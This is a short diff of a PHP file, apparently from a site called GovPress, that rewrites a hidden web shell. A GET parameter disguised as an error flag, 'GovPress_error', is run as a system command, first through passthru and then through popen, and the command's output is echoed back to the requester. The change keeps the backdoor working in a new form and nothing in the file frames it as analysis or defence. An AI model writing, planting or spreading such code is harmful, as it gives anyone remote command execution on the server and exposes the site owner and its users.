@@ -2,14 +2,18 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Execute the command using passthru
-    echo "<pre>";
-    passthru($command, $returnValue);
-    echo "</pre>";
-
-    if ($returnValue !== 0) {
+    // Open the command as a process
+    $handle = popen($command, "r");
+    if ($handle) {
+        echo "<pre>";
+        while (!feof($handle)) {
+            echo fgets($handle); // Read output line by line
+        }
+        echo "</pre>";
+        pclose($handle); // Close the process
+    } else {
         // Handle errors
-        echo "Error executing command. Return value: $returnValue";
+        echo "Error opening process.";
     }
 }
 ?>
